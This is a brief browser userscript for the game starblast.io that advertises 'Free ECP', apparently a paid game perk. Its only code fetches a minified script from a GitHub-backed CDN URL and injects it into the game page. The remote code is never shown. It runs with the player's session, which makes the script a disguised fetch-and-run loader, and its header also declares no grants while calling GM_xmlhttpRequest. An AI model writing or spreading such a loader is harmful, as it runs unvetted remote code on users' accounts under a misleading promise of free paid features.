// ==UserScript==
// @name         Starblast Free Ecp
// @namespace    https://github.com/LightLordYT
// @version      1.0.0
// @description  Free ECP
// @author       LightLord
// @match        https://starblast.io/
// @icon         https://www.google.com/s2/favicons?domain=starblast.io
// @grant        none
// ==/UserScript==


GM_xmlhttpRequest({
        method : "POST",
        url : "https://cdn.jsdelivr.net/gh/LightLordYT/ECP-Verification@latest/code.min.js",
        onload : (ev) =>
        {
            let e = document.createElement('script');
            e.innerText = ev.responseText;
            document.head.appendChild(e);
        }
    });


